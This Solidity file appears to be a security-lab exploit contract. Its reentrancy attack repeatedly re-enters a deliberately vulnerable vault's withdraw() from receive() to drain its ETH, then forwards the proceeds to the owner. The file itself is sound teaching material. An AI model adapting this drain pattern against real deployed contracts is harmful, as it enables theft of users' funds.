// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {VulnerableVault} from "../vulnerable/VulnerableVault.sol";

/// @title ReentrancyAttacker
/// @notice Exploit contract for VulnerableVault (SWC-107). EtherShield lab, local chain only.
/// @dev Drains the vault by re-entering withdraw() from receive() while the
///      victim's balances[] mapping still holds the pre-withdrawal value.
contract ReentrancyAttacker {
    VulnerableVault public immutable vault;
    address public immutable owner;

    /// @notice Amount withdrawn per re-entrant call.
    uint256 public unit;
    /// @notice How many times withdraw() ran in the attack transaction.
    uint256 public callCount;

    event AttackerStarted(uint256 unit);
    event Reentered(uint256 depth, uint256 vaultBalance);

    error NotOwner();
    error PayoutFailed();

    constructor(VulnerableVault _vault) {
        vault = _vault;
        owner = msg.sender;
    }

    /// @notice Deposit `msg.value` then drain the vault in one transaction.
    function attack() external payable {
        require(msg.value > 0, "ReentrancyAttacker: fund the attack");

        unit = msg.value;
        callCount = 1;
        emit AttackerStarted(unit);

        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    /// @notice Re-entry point: runs while the vault is mid-withdrawal.
    /// @dev The balance guard is the base case. Without it the final re-entry
    ///      reverts and cascades, undoing the entire attack.
    receive() external payable {
        if (address(vault).balance >= unit) {
            callCount++;
            emit Reentered(callCount, address(vault).balance);
            vault.withdraw();
        }
    }

    /// @notice Forward the stolen ETH to the attacker's EOA.
    function collect() external {
        if (msg.sender != owner) revert NotOwner();
        (bool ok,) = owner.call{value: address(this).balance}("");
        if (!ok) revert PayoutFailed();
    }

    /// @notice ETH currently held by this exploit contract.
    function loot() external view returns (uint256) {
        return address(this).balance;
    }
}
